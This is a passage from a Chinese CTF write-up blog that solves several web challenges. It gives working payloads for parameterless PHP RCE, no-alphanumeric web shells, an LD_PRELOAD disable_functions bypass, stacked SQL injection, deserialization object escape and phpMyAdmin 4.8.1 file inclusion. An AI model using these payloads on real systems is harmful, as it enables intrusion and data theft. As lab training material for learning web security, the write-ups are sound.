class="line">&#125;</span><br><span class="line">// highlight_file(__FILE__);</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
<p>不难发现这里有一个flag.php文件。要想办法读到它。<br>有三个if条件。先看第一个<br>过滤了</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">data://</span><br><span class="line">filter://</span><br><span class="line">php://</span><br><span class="line">phar://</span><br></pre></td></tr></table></figure>
<p>第二个if的正则我搞了好久的正则才记起来(太菜了)<br>在regex101匹配了一下。这里只允许使用如下的形式</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">var_dump(scandir());</span><br></pre></td></tr></table></figure>
<p>第三个if过滤了好多函数。<br>后来实在写不出来去看了wp才知道这种办法叫做无参数rce。 <a href="https://www.cnblogs.com/wangtanzhi/p/12260986.html" target="_blank" rel="noopener">传送门</a></p>
<hr>
<p>先来想办法看看目录下有些什么文件:<br>这里想的是想要用scandir配合var_dump来扫后台。但是没参数的话我构造不出来表示当前路径的.号。而且getcwd()也被过滤掉了。<br>大佬的解法:<br>localeconv()函数返回一组包含本地数字及货币格式信息的数组。而数组第一项就是.号<br>current()返回数组中的当前单元。默认取第一个值。<br>所以current(localeconv())就表示一个.号。<br>而current()有个别名叫pos()，所以这里可以用这两个payload</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">?exp=var_dump(scandir(current(localeconv())));</span><br><span class="line">?exp=var_dump(scandir(pos(localeconv())));</span><br></pre></td></tr></table></figure>
<p>发现当前目录下有4个文件<br><img src="https://i.loli.net/2020/03/20/agexpPtLRQFUOfk.png" alt="Snipaste_2020-03-20_09-09-02.png"><br>接下来要想办法读文件了。但是这里又没有办法用参数，到底要怎么整，看看大佬们的解法：<br>可以分为两步</p>
<ul>
<li>得到文件名</li>
<li>读文件</li>
</ul>
<hr>
<p>可以看到我们要读取的flag.php在倒数第二的位置。用array_reverse()反向返回一个数组。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?exp=var_dump(array_reverse(scandir(pos(localeconv()))));</span><br></pre></td></tr></table></figure>
<p>那就变成了这样<br><img src="https://i.loli.net/2020/03/20/ElO7BwjL4gZzMr8.png" alt="Snipaste_2020-03-20_09-21-18.png"><br>还要想办法得到文件名，可以使用next()函数。这个函数官方是这样描述的:</p>
<blockquote>
<p>next() 和 current() 的行为类似，只有一点区别，在返回值之前将内部指针向前移动一位。这意味着它返回的是下一个数组单元的值并将数组指针向前移动了一位。<br>意思就是pos()默认返回的是数组第一位的数据，next默认返回的是第二位的数据。那么采用如下payload我们就能得到想要的flag.php的文件名</p>
</blockquote>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?exp=var_dump(next(array_reverse(scandir(pos(localeconv())))));</span><br></pre></td></tr></table></figure>
<p><img src="https://i.loli.net/2020/03/20/tgLFQa6e8mVWoqk.png" alt="Snipaste_2020-03-20_09-29-07.png"><br>这里也可以用array_rand(array_flip())来读文件名<br>array_flip()将一个数组的键和值交换。也就是原本可能0号键的名字叫flag.php,经过array_flip处理后，<br>flag.php变成了键名，0变成了值。<br>而array_rand()则是随机取出一个数组里面的一个或多个单元。并<strong>随机返回一个或多个键名</strong>，这里默认是返回一个键名。<br>这样的话就有可能返回我们想要的文件名，这里只有四个文件，多刷新几回就能拿到flag.php。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?exp=var_dump(array_rand(array_flip(scandir(pos(localeconv())))));</span><br></pre></td></tr></table></figure>
<p>还可以用session_id(session_start())的方式拿文件名。<br>php默认是不主动使用session的。所以我们得先用session_start()让php使用session。然后用session_id()让php获取我们的id。这里手动设置id为flag.php打上去就行了。<br>如果我们没传SESSID的话会返回它创建的，如果我们传了的话就会用我们传的。<br><img src="https://i.loli.net/2020/03/20/Mh1YilPHmKJXnCc.png" alt="Snipaste_2020-03-20_10-03-11.png"></p>
<hr>
<p>接下来就是读文件了。这里大佬列出来除了file_get_contents外的三种方法</p>
<ul>
<li>readfile()</li>
<li>highlight_file()</li>
<li>show_source()<br>show_source()是highlight_file()的别名函数。<br>那这里就有3*3九种办法读文件了。随便用3个<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">?exp=readfile(next(array_reverse(scandir(pos(localeconv())))));</span><br><span class="line">?exp=show_source(next(array_reverse(scandir(pos(localeconv())))));</span><br><span class="line">?exp=highlight_file(array_rand(array_flip(scandir(pos(localeconv())))));</span><br></pre></td></tr></table></figure>
这里注意一下readfile读的flag不会回显出来。需要看源码才能看到。<br>用sessid的打法的话这样就行<br><img src="https://i.loli.net/2020/03/20/Tqyj2OCtoZbJfUV.png" alt="Snipaste_2020-03-20_10-09-17.png"><h3 id="总结-10"><a href="#总结-10" class="headerlink" title="总结"></a>总结</h3>这道题学到好多姿势。不仅仅是无参数rce的知识。还包括对正则的理解更深了。<br>前段时间还在一位表哥的wp里看到一句。在php里要过滤\需要用四个\才行。<br>因为首先”\\“是php字符串。转义后剩下两个\。再经过正则引擎的时候就只剩下一个\了。<br>关于无参数rce。还可以参考这位表哥的经验总结。<a href="https://skysec.top/2019/03/29/PHP-Parametric-Function-RCE/" target="_blank" rel="noopener">传送门</a><h2 id="极客大挑战-2019-RCE-ME"><a href="#极客大挑战-2019-RCE-ME" class="headerlink" title="[极客大挑战 2019]RCE ME"></a>[极客大挑战 2019]RCE ME</h2>知识点</li>
<li>无数字字母shell</li>
<li>disable_function绕过</li>
</ul>
<hr>
<p>进去直接就是代码部分</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">error_reporting(0);</span><br><span class="line">if(isset($_GET[&apos;code&apos;]))&#123;</span><br><span class="line">            $code=$_GET[&apos;code&apos;];</span><br><span class="line">                    if(strlen($code)&gt;40)&#123;</span><br><span class="line">                                        die(&quot;This is too Long.&quot;);</span><br><span class="line">                                                &#125;</span><br><span class="line">                    if(preg_match(&quot;/[A-Za-z0-9]+/&quot;,$code))&#123;</span><br><span class="line">                                        die(&quot;NO.&quot;);</span><br><span class="line">                                                &#125;</span><br><span class="line">                    @eval($code);</span><br><span class="line">&#125;</span><br><span class="line">else&#123;</span><br><span class="line">            highlight_file(__FILE__);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">// ?&gt;</span><br></pre></td></tr></table></figure>
<p>过滤了字母和数字，直接搜无数字字母shell。<br>找到p牛从一篇文章<a href="https://www.leavesongs.com/PENETRATION/webshell-without-alphanum.html" target="_blank" rel="noopener">传送门</a><br>基于白名单编写了如下脚本</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">valid = &apos;`~!@#$%^&amp;*()-=_+[]&#123;&#125;\|\&apos;;:\&quot;,./&lt;&gt;?&apos;</span><br><span class="line">answer = &apos;_GET&apos;</span><br><span class="line"></span><br><span class="line">temp1, temp2 = &apos;&apos;, &apos;&apos;</span><br><span class="line">for c in answer:</span><br><span class="line">    for i in valid:</span><br><span class="line">        for j in valid:</span><br><span class="line">            if (ord(i) ^ ord(j) == ord(c)):</span><br><span class="line">                temp1 += i</span><br><span class="line">                temp2 += j</span><br><span class="line">                break</span><br><span class="line">        else:</span><br><span class="line">            continue</span><br><span class="line">        break</span><br><span class="line">print(temp1, temp2)</span><br></pre></td></tr></table></figure>
<p>拼出一个_GET,然后依葫芦画瓢，构造一个代码执行的句子</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?code=$_=&quot;```~&quot;^&quot;?%27%*&quot;;$&#123;$_&#125;[_]($&#123;$_&#125;[__]);&amp;_=assert&amp;&amp;__=phpinfo()</span><br></pre></td></tr></table></figure>
<p>这里用assert不用eval是因为<a href="https://www.php.net/manual/zh/functions.variable-functions.php" target="_blank" rel="noopener">可变函数</a>的关系。<br>简单举个例子。如果一个php变量后边有括号，那么就会尝试去执行这个变量值所对应的函数，比如</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$a = phpinfo;</span><br><span class="line">$a();</span><br></pre></td></tr></table></figure>
<p>会执行phpinfo()这个函数。<br>前面也说过如果在””包裹起来的字符串里放一个php变量，那php会尝试去解析这个变量。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$a = &apos;irrik&apos;;</span><br><span class="line">echo &quot;$a&quot;; // irrik</span><br></pre></td></tr></table></figure>
<p>这里还牵扯到一个可变变量的知识点。<br>首先要知道，刚才的phpinfo()也就是可变函数的例子，不是包裹在双引号里面执行的。<br>但是其实双引号里面也可以执行phpinfo()这个函数。<br>比如</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">echo &quot;$&#123;phpinfo()&#125;&quot;; //有无echo不碍事</span><br><span class="line">---</span><br><span class="line">$a = &quot;phpinfo&quot;;</span><br><span class="line">echo &quot;&#123;$a()&#125;&quot;; //有无echo不碍事</span><br></pre></td></tr></table></figure>
<p>这两都是<a href="https://www.php.net/manual/zh/language.variables.variable.php" target="_blank" rel="noopener">可变变量</a>的知识点<br>在字符串里边加上{}的话会先去把里面的东西当成变量给执行一遍然后把返回值在取出来。这里是php可变变量的两种形式。<br>但是注意第二种形式如果$a=phpinfo()的话是执行不了的，第二种形式的执行过程应该是解析$a的时候拿出了phpinfo，然后由于可变函数的关系，尝试调用了phpinfo()函数。<br>然后phpinfo()执行成功返回了true最后变成了echo “1”<br>扯了这么多回到正题，之所以使用assert不适用eval是因为eval是一种语言结构，不能像assert一样当作可变函数利用(当然php7之后assert也变成了语言结构)<br>但是这个题的版本还是能用的。<br>先看看phpinfo</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?code=$_=&quot;```~&quot;^&quot;?%27%*&quot;;$&#123;$_&#125;[_]($&#123;$_&#125;[__]);&amp;_=assert&amp;&amp;__=phpinfo()</span><br></pre></td></tr></table></figure>
<p>发现disable_function禁用了一堆函数。没办法直接rce。构造一个shell连接上去看看</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?code=$_=%22```~%22^%22?%27%*%22;$&#123;$_&#125;[_]($&#123;$_&#125;[__]);&amp;_=assert&amp;&amp;__=eval(%22$_POST[a];%22)</span><br></pre></td></tr></table></figure>
<p>发现目录下有个flag和readflag<br>直接打开flag肯定是不行的了。不会就看wp。<br>发现需要绕过disable_function<br>其实这题可以直接非预期用蚁剑的绕过disable_function插件过掉。但是做题的目的不是flag所以看看预期解<a href="https://evoa.me/index.php/archives/62/" target="_blank" rel="noopener">传送门</a><br>详细看了看那篇freebuf的解释。有点懵懵懂懂，但是好歹是知道了大意:<br>通过访问一个我们上传的文件，从中传命令到环境变量中。而我们访问的文件会指定可控的so文件，so文件又会从环境变量中取出我们的命令来执行，于是得以成功rce。<br>虽然有了方法，但是本题复现的时候还是有一点小问题，那就是html文件不能传文件。<br>又参看了另一个大佬的wp<a href="https://www.moonback.xyz/2019/11/06/syc-ctf-wp/" target="_blank" rel="noopener">传送门</a><br>传上我们刚才freebuf文章后面的github工具包的so文件到/tmp下，然后通过之前构造的句子写入如下内容</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?code=$_=&quot;```~&quot;^&quot;?%27%*&quot;;$&#123;$_&#125;[_]($&#123;$_&#125;[__]);&amp;_=assert&amp;&amp;__=file_put_contents(&quot;/tmp/moonback&quot;,&quot;&lt;?php putenv(&apos;EVIL_CMDLINE=&apos;.&apos;cd /%26%26./readflag &gt; /tmp/moonback1 2&gt;%261&apos;);putenv(&apos;LD_PRELOAD=&apos;.&apos;/tmp/bypass_disablefunc_x64.so&apos;);mail(&apos;&apos;, &apos;&apos;, &apos;&apos;, &apos;&apos;);?&gt;&quot;)</span><br></pre></td></tr></table></figure>
<p>这样就在/tmp下创建了一个moonback文件，只要执行这个文件就能通过mail函数触发我们的so文件，执行/readflag。(so文件内容是什么自己去freebuf那篇里看)<br>然后还需要创建一个moonback1文件用来接收输出内容。当然也是在tmp文件夹下面。<br>随后</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">include(&apos;/tmp/moonback&apos;) //触发so文件，执行EVIL_CMDLINE内容</span><br><span class="line">var_dump(file_get_contents(&apos;/tmp/moonback1&apos;)) //读flag</span><br></pre></td></tr></table></figure>
<p>结束。</p>
<h3 id="总结-11"><a href="#总结-11" class="headerlink" title="总结"></a>总结</h3><p>这道题真的是花了我不少的时间。所幸，学到了很多。<br>从基本的无参数shell编写，到可变函数，可变变量。<br>再到LD_PRELOAD的so文件劫持，随后又由于环境不同再次阅读源码，加深了理解。<br>谢谢各位表哥。</p>
<h2 id="ASIS-2019-Unicorn-shop"><a href="#ASIS-2019-Unicorn-shop" class="headerlink" title="[ASIS 2019]Unicorn shop"></a>[ASIS 2019]Unicorn shop</h2><p>知识点</p>
<ul>
<li>unicode等价符号</li>
</ul>
<hr>
<p>进去的时候就是<br><img src="https://i.loli.net/2020/03/31/y5efRlmPvXzHpi1.png" alt="Snipaste_2020-03-31_08-37-26.png"><br>看源码发现如下提示</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;meta charset=&quot;utf-8&quot;&gt;&lt;!--Ah,really important,seriously. --&gt;</span><br></pre></td></tr></table></figure>
<p>大概就能想到是unicode有关的东西了。<br>看到有四个商品，逐一尝试商品id 价格1.<br>1，2，3三个商品都提示错误商品，只有第四个是提示钱不够。<br>然后输入4，1337又会提示只允许一个字符。想来想去没想到点上看wp。<br>发现是用特殊字符来解题。比如某个字符代表数字10000啥的。<br>可以看看这些文章：<br><a href="https://xz.aliyun.com/t/5402#toc-0" target="_blank" rel="noopener">传送门</a><br><a href="https://blog.lyle.ac.cn/2018/10/29/unicode-normalization/" target="_blank" rel="noopener">传送门</a><br><a href="https://www.compart.com/en/unicode/U+2188" target="_blank" rel="noopener">搜字符传送门</a><br>在这个网站搜thousand就能搜到大于1000的字符。选一个把16进制的0x换成%然后提交就能买到flag。</p>
<h3 id="总结-12"><a href="#总结-12" class="headerlink" title="总结"></a>总结</h3><p>其实这道题还是有点云里雾里的，还需要多看多理解吧。<br>也不是第一次碰到这种编码有关的题目了。</p>
<h2 id="GYCTF2020-Blacklist"><a href="#GYCTF2020-Blacklist" class="headerlink" title="[GYCTF2020]Blacklist"></a>[GYCTF2020]Blacklist</h2><p>知识点</p>
<ul>
<li>堆叠注入</li>
<li>handler代替select查询</li>
</ul>
<hr>
<p>进去随便查询就特别有堆叠注入的味道，，<br>输入’报错，发现dbms是Mariadb。<br>尝试select的时候也给出了过滤的关键字啥的。过滤了蛮多东西，尝试堆叠注入。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&apos;;show tables;</span><br></pre></td></tr></table></figure>
<p>发现了一个FlagHere表。以前强网被也有一道类似的注入，但是这里过滤了rename和alert。<br>只能另想办法。<br>其实我之前在打别的注入题的时候曾经搜到过handler代替select的解题思路。这里碰到就直接去搜了<br><img src="https://i.loli.net/2020/03/31/CZ1pPRLsS4FwGbi.png" alt="Snipaste_2020-03-31_09-32-19.png"><br><a href="https://xz.aliyun.com/t/7169" target="_blank" rel="noopener">传送门</a><br>根据例子写一下如下payload就拿到flag了</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1&apos;;handler FlagHere open as irrik;handler irrik read first;</span><br></pre></td></tr></table></figure>
<p>对了。这个payload拿去打强网杯的那道随便注也是可以的。</p>
<h3 id="总结-13"><a href="#总结-13" class="headerlink" title="总结"></a>总结</h3><p>这道题本来应该是重点考察handler的，但是正好之前碰到过所以解题比较顺利。</p>
<h2 id="ACTF2020-新生赛-Upload"><a href="#ACTF2020-新生赛-Upload" class="headerlink" title="[ACTF2020 新生赛]Upload"></a>[ACTF2020 新生赛]Upload</h2><p>知识点</p>
<ul>
<li>phtml解析绕过<br>这道题有个前端检查，直接覆盖掉函数就行。<br>写上一句话然后把文件后缀改成.phtml。<br>随后蚁剑连接就行。<br>这里会把从右到左第一个.号之后的文件名改掉。所以思路不是上图片马然后传.user.ini或.htaccess。<br>直接尝试解析漏洞就行。<h2 id="安洵杯-2019-easy-serialize-php"><a href="#安洵杯-2019-easy-serialize-php" class="headerlink" title="[安洵杯 2019]easy_serialize_php"></a>[安洵杯 2019]easy_serialize_php</h2>知识点</li>
<li>变量覆盖</li>
<li>反序列化中的对象逃逸</li>
</ul>
<hr>
<p>进去直接给代码了<br><img src="https://i.loli.net/2020/03/31/ITDky1JYZ2Sp4qn.png" alt="Snipaste_2020-03-31_17-53-21.png"><br>这题应该是想办法通过img变量读文件，但是有个sha1加密并且没有解密，肯定不会直接传出来。<br>思路到这里就断掉了。找了两个文章参考了一下<br><a href="https://xz.aliyun.com/t/6911#toc-3" target="_blank" rel="noopener">官方wp</a><br><a href="https://www.cnblogs.com/wangtanzhi/p/12261610.html" target="_blank" rel="noopener">大佬wp</a><br>由于这里在序列化之后用了过滤函数，破坏了原有结构，导致了漏洞。<br>参考着上面文章自己复现了一下</p>
<hr>
<p>首先是查看了自己不熟悉的extract函数。把一个数组的键和值拉出来当成变量和变量值。<br>这里就是变量覆盖的考点了。但是还不知道怎么样用。往下看。<br>发现对序列化后的对象使用了编写的过滤函数。这里有一个对象逃逸漏洞</p>
<blockquote>
<p>任何具有一定结构的数据，如果经过了某些处理而把结构体本身的结构给打乱了，则有可能会产生漏洞<br>再往下发现img这个变量可以读取任意文件，应该就是利用这里来找flag了。<br>提示了phpinfo里面有东西，找进去的话发现提示了一个d0g3_f1ag.php文件，想办法包含这个。<br>直接用传image_path为d0g3_f1ag.php肯定是行不通的，有个sha1加密且没有解密。<br>这里就用到了对象逃逸的知识。<br>我试了一下，_SESSION这个数组对象的先后顺序和成员定义顺序有关，把这个题目的源码拉到本地。<br>想办法和wp一样构造一个payload出来读数据。<br>这里一个重要的思想就是，如果有一下序列化对象</p>
</blockquote>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">a:3:&#123;s:4:&quot;user&quot;;s:22:&quot;&quot;;s:8:&quot;function&quot;;s:55:&quot;;s:3:&quot;img&quot;;s:20&quot;ZDBnM19mMWFnLnBocA==&quot;;s:1:&quot;d&quot;;s:1:&quot;1&quot;;&#125;&quot;;s:3:&quot;img&quot;;s:20:&quot;Z3Vlc3RfaW1nLnBuZw==&quot;;&#125;</span><br></pre></td></tr></table></figure>
<p>可以看到这个对象是数组(a),有三个键。且user的值为空了。但是要注意，在反序列化的时候，还是会往后读取22位。来仔细看看</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">a:3:&#123;s:4:&quot;user&quot;;s:22:&quot;&quot;;s:8:&quot;function&quot;;s:55:&quot;;s:3:&quot;img&quot;;s:20&quot;ZDBnM19mMWFnLnBocA==&quot;;s:1:&quot;d&quot;;s:1:&quot;1&quot;;&#125;&quot;;s:3:&quot;img&quot;;s:20:&quot;Z3Vlc3RfaW1nLnBuZw==&quot;;&#125;</span><br><span class="line">分为3部分</span><br><span class="line">第一部分是</span><br><span class="line">a:3:&#123;s:4:&quot;user&quot;;s:22:&quot;&quot;;s:8:&quot;function&quot;;s:55:&quot;;而&quot;;s:8:&quot;function&quot;;s:55:长度正好为22.于是就会把这里本应是键名的function吞掉</span><br><span class="line">从而达成了我们的目的--控制img。</span><br><span class="line">第二部分是</span><br><span class="line">s:3:&quot;img&quot;;s:20&quot;ZDBnM19mMWFnLnBocA==&quot;;s:1:&quot;d&quot;;s:1:&quot;1&quot;;&#125;&quot;;</span><br><span class="line">这里包含了img和一个凑数的d两个键，为什么要d？因为在反序列化完成之后后边的非法数据(第三部分)会被忽略掉。</span><br><span class="line">从哪里知道反序列化结束了？ &#125;符号会指出。</span><br><span class="line"></span><br><span class="line">第三部分是</span><br><span class="line">s:3:&quot;img&quot;;s:20:&quot;Z3Vlc3RfaW1nLnBuZw==&quot;;&#125;</span><br><span class="line">这是原来的img，但是由于我们的精心构造，被忽略了。</span><br></pre></td></tr></table></figure>
<p>总结一下刚才的分析：<br>利用反序列化读取特点，构造正好闭合的数据，让我们能往里面加东西，随后闭合整个反序列化，忽略掉原本的数据。<br>根据拉下来的源码，在本地慢慢调试，得到如下payload</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">_SESSION[user]=flagflagflagflagphpphp&amp;_SESSION[function]=;s:3:&quot;img&quot;;s:20:&quot;ZDBnM19mMWFnLnBocA==&quot;;s:1:&quot;d&quot;;s:1:&quot;1&quot;;&#125;&amp;function=show_image</span><br></pre></td></tr></table></figure>
<p>这是读取d0g3_f1ag.php文件的，随后提示我们flag在/d0g3_fllllllag’，同样构造一个payload。这里出题人特意把文件名长度搞得一样，于是只需要替换一下base64编码的值就行了。</p>
<h3 id="总结-14"><a href="#总结-14" class="headerlink" title="总结"></a>总结</h3><p>又是船新的知识点，爱了。利用这种逃逸感觉很像sql注入和http走私的样子哈哈。总而言之是学到好多，谢谢款待。</p>
<h2 id="GWCTF-2019-我有一个数据库"><a href="#GWCTF-2019-我有一个数据库" class="headerlink" title="[GWCTF 2019]我有一个数据库"></a>[GWCTF 2019]我有一个数据库</h2><p>知识点</p>
<ul>
<li>phpmyadmin4.8.1文件包含漏洞</li>
</ul>
<hr>
<p>进去啥不知道干啥，遇事不决扫后台。扫到了一个phpinfo和phpmyadmin。<br>一开始以为是直接查表。后来翻了一下发现不对劲。随后就点开一看，查了phpmyadmin版本的cve。<br>果然有问题。参考连接<br><a href="https://www.exploit-db.com/exploits/44928" target="_blank" rel="noopener">传送门</a><br><a href="https://www.cnblogs.com/bmjoker/p/9897436.html" target="_blank" rel="noopener">传送门</a><br>本题的session目录在/var/lib/php/sessions/下。<br>先放payload</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://78198e5f-168e-4cd9-9759-a4e159c2824f.node3.buuoj.cn/phpmyadmin/index.php?target=db_sql.php%253f/../../../../../../../../var/lib/php/sessions/sess_61t0568rfp4pbhblqb1jal7g0j</span><br></pre></td></tr></table></figure>
<p>这里我包含的是我的session文件。这个按道理来说是可以根据写入的select语句getshell的。<br>查看自己的phpmyadmin的sessionid，然后加上sess_前缀就是自己的文件了。<br>在phpmyadmin的sql语句执行处分别执行</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">select &apos;&lt;?php echo system(&quot;ls /&quot;);?&gt;&apos;;</span><br><span class="line">select &apos;&lt;?php echo system(&quot;cat /flag&quot;);?&gt;&apos;;</span><br></pre></td></tr></table></figure>
<p>然后刷新文件包含，可以查询到命令执行结果.这里尝试getshell的，不过失败了，原因还不知道是啥。</p>
<h3 id="总结-15"><a href="#总结-15" class="headerlink" title="总结"></a>总结</h3><p>这道题看似一把梭，但是其实等待靶机的时间(<br>还是学到了东西的，谢谢款待。</p>
<h2 id="V-amp-N2020-公开赛-HappyCTFd"><a href="#V-amp-N2020-公开赛-HappyCTFd" class="headerlink" title="[V&amp;N2020 公开赛]HappyCTFd"></a>[V&amp;N2020 公开赛]HappyCTFd</h2><p>知识点</p>
<ul>
<li>ctfd2.1,2.2版本的用户接管漏洞</li>
</ul>
<hr>
<p>进去的时候看到一个类似模板的东西，想着会不会是源码泄露，扫了一圈，没发现。<br>又测试了一圈注入，无果。<br>随后逐一抓包尝试，没啥发现。<br>想着可能是逻辑漏洞，测了一圈也没啥东西。<br>只好灰溜溜去看wp。<br>原来还有遗漏的地方没测，没去搜框架的问题。<br>这个遇到好几次了，thingkphp,phpmyadmin都是这个问题，本次的ctfd也是使用的框架本身有问题。<br>是一个用户接管漏洞，直接搜 ctfd cve就有。<br>参考<a href="https://www.colabug.com/2020/0204/6940556/amp/" target="_blank" rel="noopener">传送门</a><br>文章分析得很详细了，注册用户检查重名的时候没做出来，但是数据入库的时候却把用户名做了strip处理。<br>于是可以加空格让自己成为admin。<br>随后在登录页面选择忘记密码(不要退出登录，会登录不上)。<br>这里由于靶机没法访问外网需要自己在buu注册一个邮箱来做题。<br>邮件发送之后还要把目前登录的账号名改掉，改成不是admin的。具体请参考刚才的文章。<br>改密码之后以admin登录，找到包含flag的文件就行。</p>
<h3 id="总结-16"><a href="#总结-16" class="headerlink" title="总结"></a>总结</h3><p>这道题，emmm，还是自己疏忽了，遗漏了测试部分。难度应该是不算大的，还是不够灵敏导致的。<br>再一次提醒自己遇到这种使用框架的题应该去搜索历史漏洞。</p>
<h2 id="CISCN2019-总决赛-Day2-Web1-Easyweb"><a href="#CISCN2019-总决赛-Day2-Web1-Easyweb" class="headerlink" title="[CISCN2019 总决赛 Day2 Web1]Easyweb"></a>[CISCN2019 总决赛 Day2 Web1]Easyweb</h2><p>知识点</p>
<ul>
<li>备份文件泄露</li>
<li>sql盲注</li>
<li>php短标签</li>
</ul>
<hr>
<p>进去扫后台得到image.php.bak</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">&lt;﻿?php</span><br><span class="line">include &quot;config.php&quot;;</span><br><span class="line"></span><br><span class="line">$id=isset($_GET[&quot;id&quot;])?$_GET[&quot;id&quot;]:&quot;1&quot;;</span><br><span class="line">$path=isset($_GET[&quot;path&quot;])?$_GET[&quot;path&quot;]:&quot;&quot;;</span><br><span class="line"></span><br><span class="line">$id=addslashes($id);</span><br><span class="line">$path=addslashes($path);</span><br><span class="line"></span><br><span class="line">$id=str_replace(array(&quot;\\0&quot;,&quot;%00&quot;,&quot;\\&apos;&quot;,&quot;&apos;&quot;),&quot;&quot;,$id);</span><br><span class="line">$path=str_replace(array(&quot;\\0&quot;,&quot;%00&quot;,&quot;\\&apos;&quot;,&quot;&apos;&quot;),&quot;&quot;,$path);</span><br><span class="line"></span><br><span class="line">$result=mysqli_query($con,&quot;select * from images where id=&apos;&#123;$id&#125;&apos; or path=&apos;&#123;$path&#125;&apos;&quot;);</span><br><span class="line">$row=mysqli_fetch_array($result,MYSQLI_ASSOC);</span><br><span class="line"></span><br><span class="line">$path=&quot;./&quot; . $row[&quot;path&quot;];</span><br><span class="line">header(&quot;Content-Type: image/jpeg&quot;);</span><br><span class="line">readfile($path);</span><br></pre></td></tr></table></figure>
<p>到这里感觉是想办法绕过过滤去注入。这里虽然感觉和上面一题反序列化对象逃逸有点类似。但是一时间没想到好的绕过办法。<br>把源码放本地试了一下，没搞出啥东西。<br>又去看wp了。跟着wp来。<a href="https://www.jianshu.com/p/e0e59ed2d6d2" target="_blank" rel="noopener">传送门</a><br>知道了可以用<code>\0</code>来注入。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">id=\0&amp;path= or 1#</span><br></pre></td></tr></table></figure>
<p>被转义过后如下</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">id: \\0</span><br><span class="line">path: or 1#</span><br></pre></td></tr></table></figure>
<p>随后有一个str_replace,但是</p>
